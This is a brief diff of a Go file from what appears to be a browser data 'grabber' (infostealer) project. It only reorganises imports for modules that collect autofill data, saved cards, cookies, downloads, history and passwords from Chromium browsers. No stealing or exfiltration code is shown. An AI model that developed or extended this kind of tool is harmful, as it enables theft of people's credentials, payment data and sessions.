@@ -3,12 +3,12 @@ package browsers
 import (
 	"os"
 
-	"kdot/grabber/browsers/autofill"
-	"kdot/grabber/browsers/cards"
-	"kdot/grabber/browsers/cookies"
-	"kdot/grabber/browsers/downloads"
-	"kdot/grabber/browsers/history"
-	"kdot/grabber/browsers/pass"
+	"kdot/grabber/browsers/chromium/autofill"
+	"kdot/grabber/browsers/chromium/cards"
+	"kdot/grabber/browsers/chromium/cookies"
+	"kdot/grabber/browsers/chromium/downloads"
+	"kdot/grabber/browsers/chromium/history"
+	"kdot/grabber/browsers/chromium/pass"
 	"kdot/grabber/browsers/util"
 )
 
